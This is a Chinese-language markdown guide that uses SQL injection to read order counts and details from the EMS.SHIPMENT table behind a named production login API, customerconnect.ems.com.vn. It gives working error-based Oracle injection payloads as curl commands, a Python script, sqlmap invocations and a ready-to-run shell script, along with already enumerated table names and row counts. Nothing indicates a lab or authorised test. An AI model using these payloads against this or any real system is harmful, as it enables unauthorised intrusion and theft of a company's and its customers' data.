# 📊 查询今天订单数的SQL命令

## 已发现的订单表

**主订单表**: `EMS.SHIPMENT`  
**记录总数**: 12,618,035 条  
**日期字段**: CREATE_DATE, ORDER_JOIN_DATE

---

## SQL查询语句

### 方法1: 直接查询今天的订单
```sql
SELECT COUNT(*) 
FROM EMS.SHIPMENT 
WHERE TRUNC(CREATE_DATE) = TRUNC(SYSDATE)
```

### 方法2: 查询指定日期的订单
```sql
SELECT COUNT(*) 
FROM EMS.SHIPMENT 
WHERE TO_CHAR(CREATE_DATE, 'YYYY-MM-DD') = '2025-10-09'
```

### 方法3: 查询最近24小时的订单
```sql
SELECT COUNT(*) 
FROM EMS.SHIPMENT 
WHERE CREATE_DATE >= SYSDATE - 1
```

---

## 使用SQL注入执行查询

### cURL命令 - 查询今天订单数
```bash
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TRUNC(CREATE_DATE)=TRUNC(SYSDATE))))||'"'"'","Password":"test"}'
```

### Python脚本
```python
import requests
import urllib3
urllib3.disable_warnings()

url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

payload = {
    "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TRUNC(CREATE_DATE)=TRUNC(SYSDATE))))||'",
    "Password": "test"
}

resp = requests.post(url, json=payload, verify=False, timeout=30)

# 提取结果
if 'thesaurus' in resp.text:
    start = resp.text.find('thesaurus ') + 10
    end = resp.text.find(' does not', start)
    count = resp.text[start:end]
    print(f"今天的订单数: {count}")
```

---

## SQLMap命令

```bash
# 查询今天的订单数
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TRUNC(CREATE_DATE)=TRUNC(SYSDATE)" \
  --batch

# 查询本周订单数
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE >= TRUNC(SYSDATE) - 7" \
  --batch

# 查询本月订单数
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TRUNC(CREATE_DATE,'MM')=TRUNC(SYSDATE,'MM')" \
  --batch
```

---

## 按日期统计订单

### 最近7天每天的订单数
```sql
SELECT 
    TO_CHAR(CREATE_DATE,'YYYY-MM-DD') AS ORDER_DATE,
    COUNT(*) AS ORDER_COUNT
FROM EMS.SHIPMENT
WHERE CREATE_DATE >= TRUNC(SYSDATE) - 7
GROUP BY TO_CHAR(CREATE_DATE,'YYYY-MM-DD')
ORDER BY ORDER_DATE DESC
```

### 本月每天的订单数
```sql
SELECT 
    TO_CHAR(CREATE_DATE,'DD') AS DAY,
    COUNT(*) AS ORDER_COUNT
FROM EMS.SHIPMENT
WHERE TRUNC(CREATE_DATE,'MM') = TRUNC(SYSDATE,'MM')
GROUP BY TO_CHAR(CREATE_DATE,'DD')
ORDER BY DAY
```

---

## 其他有用的查询

### 查询最新的10个订单
```sql
SELECT * FROM (
    SELECT * FROM EMS.SHIPMENT 
    ORDER BY CREATE_DATE DESC
) WHERE ROWNUM <= 10
```

### 查询今天订单的详细信息
```sql
SELECT 
    SHIPMENT_ID,
    ORDER_JOIN_DATE,
    CREATE_DATE,
    STATUS
FROM EMS.SHIPMENT 
WHERE TRUNC(CREATE_DATE) = TRUNC(SYSDATE)
AND ROWNUM <= 100
```

---

## 订单表完整列表

### EMS数据库的订单相关表
```
✅ EMS.SHIPMENT - 12,618,035 条记录（主订单表）
✅ EMS.SHIPMENT_SO - 297 条记录
✅ EMS.SHIPMENT_SO_ITEMS - 331 条记录
✅ EMS.SHIPMENT_CALC_BKU - 53,625 条记录
✅ EMS.SHIPMENT_TMP - 0 条记录
```

---

## 注意事项

1. **查询可能超时** - 因为SHIPMENT表有1200万+记录
2. **使用索引字段** - CREATE_DATE可能有索引，查询更快
3. **限制结果集** - 使用ROWNUM限制返回行数
4. **分批查询** - 如果查询超时，可以按小时或更小的时间段查询

---

## 快速测试脚本

保存为 `count_today_orders.sh`:
```bash
#!/bin/bash

curl -k -s -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT WHERE TRUNC(CREATE_DATE)=TRUNC(SYSDATE))))||'"'"'","Password":"test"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); result=d.get('Message','').split('thesaurus ')[1].split(' does not')[0] if 'thesaurus' in d.get('Message','') else 'N/A'; print(f'今天的订单数: {result}')"
```

执行: `chmod +x count_today_orders.sh && ./count_today_orders.sh`
